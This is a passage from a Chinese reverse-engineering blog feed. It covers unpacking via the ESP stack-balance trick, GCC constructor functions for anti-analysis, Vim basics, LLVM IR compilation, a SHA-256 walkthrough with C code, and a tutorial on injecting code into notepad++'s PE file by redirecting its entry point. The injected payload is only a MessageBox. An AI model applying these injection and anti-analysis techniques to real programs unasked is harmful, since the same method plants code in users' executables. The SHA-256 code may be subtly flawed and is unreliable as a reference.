title="原理"></a>原理</h4><p>首先，我们知道壳相当于一个子程序，它在程序运行时首先获得控制权并对程序进行压缩，同时隐藏程序的OEP。</p><p>在编写加壳软件时，必须保证外壳初始化的现场环境（各寄存器的值）与原程序的现场环境是一致的（主要是ESP、EBP等重要的寄存器）。加壳程序在初始化时保存各寄存器的值，待外壳执行完毕恢复现场环境。通常用的指令前面也介绍了。</p><p>在脱壳时，根据栈平衡原理（因为壳相当于子程序嘛，所以我们要保证壳运行完，将控制权交换程序的时候堆栈要平衡）对ESP下断，很快就能找到OEP</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>可以看到刚载入时断在了push ad，这时候我们F8</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648361229454.png" alt="刚载入"></p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648361410288.png" alt="F8前寄存器和堆栈"></p><p>F8之后，ESP发生改变，寄存器的值也被压入了栈中</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648361564539.png" alt="F8之后"></p><p>对ESP下硬件访问断点</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648361685665.png"></p><p>也可以现在右键ESP，在数据窗口跟随，然后选中前四个字节右键-&gt;断点-&gt;硬件访问-&gt;DWORD</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648361790656.png" alt="数据窗口设置断点"></p><p>设置好断点后F9</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648361835848.png" alt="F9之后"></p><p>然后一直单步到jmp</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648361889146.png"></p><p>这里有个往上跳的，只需要在jnz下一行处按F4即可</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648361978941.png" alt="jmp之后"></p><p>这时候已经到达OEP了，可以发现堆栈和刚载入时一样</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648362682513.png" alt="对比"></p><p>dump下来即可-&gt;右键-&gt;使用OllyDump脱壳调试进程即可</p><p><img src="/2022/03/26/%E5%8E%8B%E7%BC%A9%E5%A3%B3%E7%9A%84%E5%AD%A6%E4%B9%A0/1648362058903.png" alt="Dump"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gcc中在main前和后执行的函数</title>
      <link href="/2022/03/25/Gcc%E4%B8%AD%E5%9C%A8main%E5%89%8D%E5%92%8C%E5%90%8E%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0/"/>
      <url>/2022/03/25/Gcc%E4%B8%AD%E5%9C%A8main%E5%89%8D%E5%92%8C%E5%90%8E%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="gcc在主函数前后运行的函数"><a href="#gcc在主函数前后运行的函数" class="headerlink" title="gcc在主函数前后运行的函数"></a>gcc在主函数前后运行的函数</h1><p>逆向的时候我们直到elf文件在start函数中有main函数、init和fini函数，init就是初始化，即在主函数前运行的函数，fini就是在主函数之后执行的函数</p><p><img src="/2022/03/25/Gcc%E4%B8%AD%E5%9C%A8main%E5%89%8D%E5%92%8C%E5%90%8E%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0/1648278715009.png"></p><p>那么我们怎么实现呢，windows下我没找到好方法</p><p>但是linux下则可以，我们需要用到gcc编译器</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>gcc支持_<em>attribute_</em>((constructor)) void FunctionName()，这样这个函数就是在主函数运行前的函数，_<em>attribute_</em>((destructor)) void FunctionName{}是在主函数运行之后执行的。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;char string[]="123456";__attribute__((constructor)) void FunctionName(){printf("helloworld");}int main(){printf("%s",string);return 0;}</code></pre><p>效果</p><p><img src="/2022/03/25/Gcc%E4%B8%AD%E5%9C%A8main%E5%89%8D%E5%92%8C%E5%90%8E%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0/1648279627114.png"></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>我们可以定义全局变量的密钥，然后在init中修改密钥，进而阻碍他人的静态分析</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vim编辑器使用</title>
      <link href="/2022/03/25/Vim%E7%BC%96%E8%BE%91%E5%99%A8%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/03/25/Vim%E7%BC%96%E8%BE%91%E5%99%A8%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Vim键盘图"><a href="#Vim键盘图" class="headerlink" title="Vim键盘图"></a>Vim键盘图</h1><p><img src="/2022/03/25/Vim%E7%BC%96%E8%BE%91%E5%99%A8%E4%BD%BF%E7%94%A8/1648206284939.png" alt="Vim键盘图"></p><h1 id="Vim模式"><a href="#Vim模式" class="headerlink" title="Vim模式"></a>Vim模式</h1><p>vim分成三种模式，分别是命令模式、输入模式、底线命令模式</p><h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><p>用户刚进入vim，便进入命令模式</p><p>这时我们敲击键盘的动作被识别为命令</p><p>以下是常用的几个命令</p><p>i：进入输入模式</p><p>x：删除当前光标所在处的字符</p><p>：：切换到底线命令模式，这样我们就可以在最底一行输入命令</p><h2 id="输入模式"><a href="#输入模式" class="headerlink" title="输入模式"></a>输入模式</h2><p>1、字符按键和shift组合：输入字符</p><p>2、ENTER：回车键，换行</p><p>3、BaceSpace：退格键，删除光标前一个字符</p><p>4、DEL：删除键，删除光标后一个字符</p><p>5、方向键：移动光标</p><p>6、HOME/END：移动光标到行首、行尾</p><p>7、Page Up/Page Down：上/下翻页</p><p>8、Insert： 切换光标为输入/替换模式，光标将变成竖线/下划线 </p><p>9、 退出输入模式，切换到命令模式 </p><h2 id="底线命令模式"><a href="#底线命令模式" class="headerlink" title="底线命令模式"></a>底线命令模式</h2><p>省略掉冒号的基本命令</p><p>1、q：退出程序</p><p>2、w：保存文件</p><p>3、命令末尾加上!表示强制执行</p><h1 id="更多命令"><a href="#更多命令" class="headerlink" title="更多命令"></a>更多命令</h1><p><a href="https://www.runoob.com/linux/linux-vim.html">https://www.runoob.com/linux/linux-vim.html</a></p><p>vim复制粘贴-这里wo</p><p><a href="https://www.cnblogs.com/huahuayu/p/12235242.html">https://www.cnblogs.com/huahuayu/p/12235242.html</a></p><p>Vim配置</p><p><a href="https://blog.csdn.net/Doctor_xiong/article/details/78663590">https://blog.csdn.net/Doctor_xiong/article/details/78663590</a></p><h1 id="GCC生成可执行文件"><a href="#GCC生成可执行文件" class="headerlink" title="GCC生成可执行文件"></a>GCC生成可执行文件</h1><h2 id="Vim生成-c文件"><a href="#Vim生成-c文件" class="headerlink" title="Vim生成.c文件"></a>Vim生成.c文件</h2><p>vim 文件名.c即可生成.c文件</p><h2 id="GCC编译成可执行文件"><a href="#GCC编译成可执行文件" class="headerlink" title="GCC编译成可执行文件"></a>GCC编译成可执行文件</h2><p>gcc 文件名.c -o 输入文件名</p><p><img src="/2022/03/25/Vim%E7%BC%96%E8%BE%91%E5%99%A8%E4%BD%BF%E7%94%A8/1648209669071.png"></p><h1 id="Vim复制和粘贴"><a href="#Vim复制和粘贴" class="headerlink" title="Vim复制和粘贴"></a>Vim复制和粘贴</h1><p>这个链接解决了系统粘贴板和vim粘贴板的共通</p><p><a href="https://www.cnblogs.com/Biiigwang/p/12086514.html">https://www.cnblogs.com/Biiigwang/p/12086514.html</a></p><p>我们先把光标移动到我们需要复制数据的起始位置，然后在命令模式中按v进入可视模式，然后移动光标来选中，按v就可以实现复制，按p粘贴</p><h1 id="Vim的撤销与恢复撤销"><a href="#Vim的撤销与恢复撤销" class="headerlink" title="Vim的撤销与恢复撤销"></a>Vim的撤销与恢复撤销</h1><p>在命令模式中，我们按u可以撤销插入模式中的操作，而Ctrl+r可以恢复我们的撤销</p><h1 id="Vim直接编译C"><a href="#Vim直接编译C" class="headerlink" title="Vim直接编译C"></a>Vim直接编译C</h1><p>配置好之后按F5即可运行，并生成可执行文件</p><p><a href="https://blog.csdn.net/qq_33505303/article/details/66473907">https://blog.csdn.net/qq_33505303/article/details/66473907</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLVM程序集</title>
      <link href="/2022/03/24/LLVM%E7%A8%8B%E5%BA%8F%E9%9B%86/"/>
      <url>/2022/03/24/LLVM%E7%A8%8B%E5%BA%8F%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="学习链接"><a href="#学习链接" class="headerlink" title="学习链接"></a>学习链接</h1><p>这里我没办法细讲，因为也是第一次接触，后续深入了解后再补</p><p><a href="https://www.1024sou.com/article/387833.html">https://www.1024sou.com/article/387833.html</a></p><p>clang常用编译命令</p><p><a href="https://blog.csdn.net/pc153262603/article/details/89553688">https://blog.csdn.net/pc153262603/article/details/89553688</a></p><p>指令集</p><p><a href="https://blog.csdn.net/qq_37206105/article/details/115274241">https://blog.csdn.net/qq_37206105/article/details/115274241</a></p><h1 id="LLVM程序集转为ELF可执行文件"><a href="#LLVM程序集转为ELF可执行文件" class="headerlink" title="LLVM程序集转为ELF可执行文件"></a>LLVM程序集转为ELF可执行文件</h1><p>打开附件发现有点难看懂，搜索其中一段指令集后发现是LLVM指令集</p><p><img src="/2022/03/24/LLVM%E7%A8%8B%E5%BA%8F%E9%9B%86/1648121627952.png"></p><h2 id="转为ELF可执行文件"><a href="#转为ELF可执行文件" class="headerlink" title="转为ELF可执行文件"></a>转为ELF可执行文件</h2><p> clang task.ll -mllvm -W -g -W1,-pie -o task.out </p><p>使用上面的命令即可生成elf文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sha256</title>
      <link href="/2022/03/23/sha256/"/>
      <url>/2022/03/23/sha256/</url>
      
        <content type="html"><![CDATA[<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://zhuanlan.zhihu.com/p/94619052">https://zhuanlan.zhihu.com/p/94619052</a></p><p><a href="https://www.52pojie.cn/forum.php">https://www.52pojie.cn/forum.php</a></p><h1 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h1><h2 id="符号替换-使用函数"><a href="#符号替换-使用函数" class="headerlink" title="符号替换-使用函数"></a>符号替换-使用函数</h2><ul><li><img src="https://www.zhihu.com/equation?tex=%5Coplus" alt="[公式]">: 按位异或</li><li><img src="https://www.zhihu.com/equation?tex=%5Cwedge" alt="[公式]">: 按位与</li><li><img src="https://www.zhihu.com/equation?tex=%5Cvee" alt="[公式]">: 按位或</li><li><img src="https://www.zhihu.com/equation?tex=%5Clnot" alt="[公式]">: 补位</li><li><img src="https://www.zhihu.com/equation?tex=+" alt="[公式]">: 相加以后对<img src="https://www.zhihu.com/equation?tex=2%5E%7B32%7D" alt="[公式]">求余</li><li><img src="https://www.zhihu.com/equation?tex=R%5En" alt="[公式]">: 右移n位</li><li><img src="https://www.zhihu.com/equation?tex=S%5En" alt="[公式]">: 循环右移n位</li></ul><p> <img src="/2022/03/23/sha256/equation-1648645011885.svg" alt="使用到的函数"> </p><h2 id="消息预处理"><a href="#消息预处理" class="headerlink" title="消息预处理"></a>消息预处理</h2><h3 id="消息补位"><a href="#消息补位" class="headerlink" title="消息补位"></a>消息补位</h3><p>先对消息摘要实现补码，假设消息M的二进制编码长度为l位。那么我们现在消息末尾补上一位1，然后再补上k个0，其中k为下列方程的最小非负整数</p><p> <img src="/2022/03/23/sha256/equation-1648645283142.svg" alt="计算K的公式"> </p><blockquote><p>特殊情况：当l长度为448时要填充加上512bits，449的话就填充511bits</p><p>447的话直接填充一个1即可</p></blockquote><p>最后填充64位，这64位是l的二进制编码</p><p>补完位的消息长度为512的倍数</p><h3 id="将补位完的消息进行分组"><a href="#将补位完的消息进行分组" class="headerlink" title="将补位完的消息进行分组"></a>将补位完的消息进行分组</h3><p> 将补码处理后的消息以512位为单位分块为: <img src="/2022/03/23/sha256/equation-1648645770037.svg" alt="[公式]"> </p><p>将每个消息块分为16×32bits， 前32位表示为: <img src="/2022/03/23/sha256/equation-1648645804943.svg" alt="[公式]">, 后面32位为: <img src="/2022/03/23/sha256/equation-1648645804934.svg" alt="[公式]">, 以此类推, 最后32位的消息块可表示为: <img src="/2022/03/23/sha256/equation-1648645804929.svg" alt="[公式]"> ，而在C语言中，32位正好对应unsigned int</p><h3 id="消息块扩充"><a href="#消息块扩充" class="headerlink" title="消息块扩充"></a>消息块扩充</h3><p>这里我们得到的是16个32bits消息块，要把其扩展为64个32bits的消息块</p><p>扩展代码</p><pre class="language-c" data-language="c"><code class="language-c">for i from 16 to 63    s0 := (w[i-15] rightrotate 7) xor (w[i-15] rightrotate 18) xor(w[i-15] rightshift 3)    s1 := (w[i-2] rightrotate 17) xor (w[i-2] rightrotate 19) xor(w[i-2] rightshift 10)    w[i] := w[i-16] + s0 + w[i-7] + s1</code></pre><h2 id="Hash主要加密流程"><a href="#Hash主要加密流程" class="headerlink" title="Hash主要加密流程"></a>Hash主要加密流程</h2><h3 id="常量初始化"><a href="#常量初始化" class="headerlink" title="常量初始化"></a>常量初始化</h3><p>初始哈希值取自自然数前8个素数(2,3,5,7,11,13,17,19)的平方根的小数部分的前32位的十六进制表示，比如：</p><p><img src="/2022/03/23/sha256/equation-1648646228740.svg" alt="[公式]">小数部分约为0.414213562373095048 </p><p> <img src="/2022/03/23/sha256/equation-1648646248870.svg" alt="根号2的十六进制表示"> </p><p>于是，取出前32位对应0x6a09e667</p><p>依次得到初始化的H值</p><p> <img src="/2022/03/23/sha256/equation-1648646313831.svg" alt="初始化H值"> </p><h3 id="sha256的64个常数"><a href="#sha256的64个常数" class="headerlink" title="sha256的64个常数"></a>sha256的64个常数</h3><p> 取自自然数中前面64个素数的立方根的小数部分的前32位的十六进制表示</p><pre class="language-c" data-language="c"><code class="language-c">428a2f98 71374491 b5c0fbcf e9b5dba53956c25b 59f111f1 923f82a4 ab1c5ed5d807aa98 12835b01 243185be 550c7dc372be5d74 80deb1fe 9bdc06a7 c19bf174e49b69c1 efbe4786 0fc19dc6 240ca1cc2de92c6f 4a7484aa 5cb0a9dc 76f988da983e5152 a831c66d b00327c8 bf597fc7c6e00bf3 d5a79147 06ca6351 1429296727b70a85 2e1b2138 4d2c6dfc 53380d13650a7354 766a0abb 81c2c92e 92722c85a2bfe8a1 a81a664b c24b8b70 c76c51a3d192e819 d6990624 f40e3585 106aa07019a4c116 1e376c08 2748774c 34b0bcb5391c0cb3 4ed8aa4a 5b9cca4f 682e6ff3748f82ee 78a5636f 84c87814 8cc7020890befffa a4506ceb bef9a3f7 c67178f2</code></pre><p>进行64次循环加密，流程图如下：</p><p><img src="/2022/03/23/sha256/600px-SHA-2.svg.png" alt="主要加密"></p><p>这里介绍一下ABCDEFGH的值以及K数组，W是我们扩展后的消息块</p><p>先把第一个W块和K相加后mod2^32，但是在C语言中，会进行截断，超过32位直接不管超过的那一位</p><p>接着先把H7和前一个得到的结果相加后mod2^32</p><p>再把H4、H5、H6取出进行Ch加密，再和前一个结果相加后mod2^32</p><p>将H4取出进行什么1操作，再和前一步的结果相加后mod2^32</p><p>接下来分为两步，第一步把前一个的结果和H3相加后mod2^32并存储在H4，第二步，先把H0、H1、H2进行Ma操作，再和前一步的结果相加再mod2^32</p><p>然后把H0取出进行什么0操作，再和前面第二步的结果相加后mod32后存储在H0</p><p>最后进行移位存储操作，就是除了H0和H4，剩下的H值存入前一个的H值</p><p>这个步骤循环64步就是加密后的H值，这个H值会被用于下一个512bits消息块的初始H值，最后的H数组加上原来的中间Hash值就是该消息区块的Hash值</p><h1 id="C语言实现"><a href="#C语言实现" class="headerlink" title="C语言实现"></a>C语言实现</h1><pre class="language-c" data-language="c"><code class="language-c">#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;Windows.h&gt;#define SHA256_ROTL(a,b) (((a&gt;&gt;(32-b))&amp;(0x7fffffff&gt;&gt;(31-b)))|(a&lt;&lt;b))#define SHA256_SR(a,b) ((a&gt;&gt;b)&amp;(0x7fffffff&gt;&gt;(b-1)))#define SHA256_CH(x,y,z) ((x&amp;y)^((~x)&amp;z))#define SHA256_Maj(x,y,z) ((x&amp;y)^(x&amp;z)^(y&amp;z))#define SHA256_E0(x) (SHA256_ROTL(x,30)^SHA256_ROTL(x,19)^SHA256_ROTL(x,10))#define SHA256_E1(x) (SHA256_ROTL(x,26)^SHA256_ROTL(x,21)^SHA256_ROTL(x,7))#define SHA256_O0(x) (SHA256_ROTL(x,25)^SHA256_ROTL(x,14)^SHA256_SR(x,3))#define SHA256_O1(x) (SHA256_ROTL(x,15)^SHA256_ROTL(x,13)^SHA256_SR(x,10)) void SHA256_ENCODE(char* input, int len){int i;char* pos,*posend;long A, B, C, D, E, F, G, I;long W[64] = { 0 };//初始化常量数据long long H[8] = {0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19};unsigned int K[64] = {0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,};//消息补位,一个字符8位，而448位为56个字符,128个字符是1024位，512的两倍long long len_final = len + ((len % 64 &gt;= 56) ? (128 - len % 64) : (64 - len % 64));//printf("%d", len_final);//开辟空间if (!(pos = (char*)malloc(len_final))){printf("开辟空间失败！\n");exit(0);}//将字符串赋值到堆中，注意因为后面需要转为long类型运算，所以赋值时要注意大小端序的问题for ( i = 0; i &lt; len; ++i){pos[i + 3 - 2 * (i % 4)] = input[i];}//字符串后面的1和填充0pos[i + 3 - 2 * (i % 4)] = 0x80;i++;for (; i &lt; len_final; ++i){pos[i + 3 - 2 * (i % 4)] = 0;}//填充字符串的真实长度，并扩展为64位,64位也就是8个字符*((long*)(pos + len_final - 4)) = len &lt;&lt; 3;*((long*)(pos + len_final - 8)) = len &gt;&gt; 29;//每512位进行加密for (posend = pos + len_final; pos &lt; posend; pos += 64){//先分组为16*32bitfor (int j = 0; j &lt; 16; ++j){W[j] = ((long*)pos)[j];}//扩展为64*32bitfor (int j = 16; j &lt; 64; ++j){W[j] = (SHA256_O1(W[j - 2]) + W[j - 7] + SHA256_O0(W[j - 15]) + W[j - 16]);}//下面开始进行64轮加密//因为中间哈希值最后时为原来的+加密的哈希值，所以先储存A = H[0], B = H[1], C = H[2], D = H[3], E = H[4], F = H[5], G = H[6], I = H[7];for (i = 0; i &lt; 64; ++i){//T1存储加密的前一部分,T2存储加密的后一部分long T1 = I + SHA256_CH(E, F, G) + K[i] + W[i]+SHA256_E1(E);long T2 = SHA256_Maj(A, B, C) + SHA256_E0(A);//只能从后往前赋值，否则会覆盖I = G;G = F;F = E;E = D + T1;D = C;C = B;B = A;A = T1 + T2;}H[0] += A; H[1] += B;H[2] += C; H[3] += D;H[4] += E; H[5] += F;H[6] += G; H[7] += I;for (i = 0; i &lt; 8; ++i){printf("%X", H[i]);}}return;}int main(){char input[] = "ze";SHA256_ENCODE(input, strlen(input));return 0;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE-滴水逆向-手动实现</title>
      <link href="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="代码节空白节区添加代码"><a href="#代码节空白节区添加代码" class="headerlink" title="代码节空白节区添加代码"></a>代码节空白节区添加代码</h1><p>这里我们在notepad++增加MessageBoxA函数，保证先调用我们的函数再运行notepad++</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在代码区先加入对函数的调用，再将原来的OEP修改为我们插入代码在内存中的位置</p><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p> ASLR技术会使PE文件每次加载到内存的起始地址随机变化，并且进程的栈和堆的起始地址也会随机改变。 所以我们要先关闭</p><p><a href="https://baijiahao.baidu.com/s?id=1681048472768096428&amp;wfr=spider&amp;for=pc&amp;searchword=aslr">https://baijiahao.baidu.com/s?id=1681048472768096428&amp;wfr=spider&amp;for=pc&amp;searchword=aslr</a></p><p>在标准PE头属性中的第一个值改为1即可</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647081337731.png"></p><p>这样PE文件加载到内存中就不会随机化了</p><h2 id="提取关键数据"><a href="#提取关键数据" class="headerlink" title="提取关键数据"></a>提取关键数据</h2><h3 id="可选PE头"><a href="#可选PE头" class="headerlink" title="可选PE头"></a>可选PE头</h3><p>DWORD AddressOfEntryPoint-10E5DBh</p><p>DWORD ImageBase-400000h</p><h3 id="节表信息"><a href="#节表信息" class="headerlink" title="节表信息"></a>节表信息</h3><p>MIsc.DWORD VirtualSize-17C51Eh</p><p>DWORD VirtualAddress-1000h</p><p>DWORD PointerToRawData-400h</p><p>DWORD SizeOfRawData-17C600h</p><h2 id="判断能否添加"><a href="#判断能否添加" class="headerlink" title="判断能否添加"></a>判断能否添加</h2><p>如果SizeOfRawData-MIsc.DWORD VirtualSize&gt;=0x12，即可添加，这里是可以的</p><h2 id="找到在文件中代码结束的位置"><a href="#找到在文件中代码结束的位置" class="headerlink" title="找到在文件中代码结束的位置"></a>找到在文件中代码结束的位置</h2><p>先找到在文件中的偏移PointerToRawData，再找到数据段大小MIsc.DWORD VirtualSize，两者相加就是真实数据段的结束位置</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647082425978.png"></p><h2 id="添加硬编码"><a href="#添加硬编码" class="headerlink" title="添加硬编码"></a>添加硬编码</h2><p>MessageBoxA需要四个参数</p><p>call指令长度为5</p><p>jmp指令长度为5</p><blockquote><p>真正要跳转的地址=E8/E9指令的下一条指令在内存中的地址+X（X就是E8后边跟着的四个字节）</p></blockquote><p>所以我们需要添加的硬编码为6A 00 6A 00 6A 00 6A 00 E8 00 00 00 00 E9 00 00 00 00</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647082868490.png"></p><h2 id="计算E8和E9的后四个字节"><a href="#计算E8和E9的后四个字节" class="headerlink" title="计算E8和E9的后四个字节"></a>计算E8和E9的后四个字节</h2><p>先找到E8对应的真实地址，也就是MessageBoxA的地址，在od里面command-&gt;输入bp MessageBoxA-&gt;状态栏b-&gt;找到MessageBoxA的地址</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647083046046.png"></p><h3 id="E8后四字节计算"><a href="#E8后四字节计算" class="headerlink" title="E8后四字节计算"></a>E8后四字节计算</h3><p>真实地址为MessageBoxA的地址</p><p>X为MessageBoxA地址-VirtualAddress+ImageBase+8+5+Misc.VirtualSize</p><p>76BA5865</p><h3 id="E9后四字节计算"><a href="#E9后四字节计算" class="headerlink" title="E9后四字节计算"></a>E9后四字节计算</h3><p>真实地址为原来的OEP</p><p>X为ImageBase+AddressOfEntryPoint-VirtualAddress+ImageBase+8+5+5+Misc.VirtualSize</p><p>为FFF910AB</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647083638028.png"></p><h2 id="修改AddressOfPoint"><a href="#修改AddressOfPoint" class="headerlink" title="修改AddressOfPoint"></a>修改AddressOfPoint</h2><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647083743309.png"></p><p>让他先执行我们的代码，也就是修改其为插入硬编码的地址</p><p>VirtualAddress+Misc.VirtualSize=17D51Eh</p><h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>先执行MessageBoxA</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647084038464.png"></p><p>再运行程序</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647084072618.png"></p><h1 id="新增节"><a href="#新增节" class="headerlink" title="新增节"></a>新增节</h1><h2 id="大小判断"><a href="#大小判断" class="headerlink" title="大小判断"></a>大小判断</h2><p>首先我们需要知道能否新增节SizeofHeaders-最后一个节表 的位置，如果大于或等于两个节表的大小（因为节表最后必须有长度为一个节表的00填充），则可以插入</p><h2 id="修改节表数量"><a href="#修改节表数量" class="headerlink" title="修改节表数量"></a>修改节表数量</h2><p>标准PE头-&gt;WORD NumberOfSections，+1即可</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647140787003.png"></p><h2 id="添加节表信息"><a href="#添加节表信息" class="headerlink" title="添加节表信息"></a>添加节表信息</h2><p>这里直接复制.text段的信息，因为其可读可写可执行，后续可以不用再去修改节表属性</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647141001170.png"></p><h2 id="确定插入的大小"><a href="#确定插入的大小" class="headerlink" title="确定插入的大小"></a>确定插入的大小</h2><p>根据情况自行选择，这里假设我们插入0x1000字节</p><h2 id="修改内存对齐后的大小"><a href="#修改内存对齐后的大小" class="headerlink" title="修改内存对齐后的大小"></a>修改内存对齐后的大小</h2><p>SizeOfImage+插入的大小（按照内存对齐）</p><h2 id="修正节表信息"><a href="#修正节表信息" class="headerlink" title="修正节表信息"></a>修正节表信息</h2><p>先看关键数据</p><p>DWORD VirtualAddress</p><p>DWORD SizeOfRawData</p><p>Misc.DWORD VirtualSize</p><p>DWORD PointerToRawData</p><p>这里为了方便将Misc.DWORD VirtualSize和DWORD SizeOfRawData都改为0x1000，注意如果插入的是其他字节数，需要计算按照文件和内存对齐来调整</p><h3 id="计算VirtualAddress"><a href="#计算VirtualAddress" class="headerlink" title="计算VirtualAddress"></a>计算VirtualAddress</h3><p>前面一个节表的VirtualAddress+Max(Misc.DWORD VirtualSize,SizeOfRawData)-按内存对齐后的</p><p>这里SizeOfRawData大于前者，按内存对齐后是15000h，加上该节表的VirtualAddress就是我们插入节表在内存中的偏移地址</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647141493979.png"></p><h3 id="计算PointerToRawData"><a href="#计算PointerToRawData" class="headerlink" title="计算PointerToRawData"></a>计算PointerToRawData</h3><p>和前面类似SizeOfRawData（文件对齐）+PointerToRawData</p><p><img 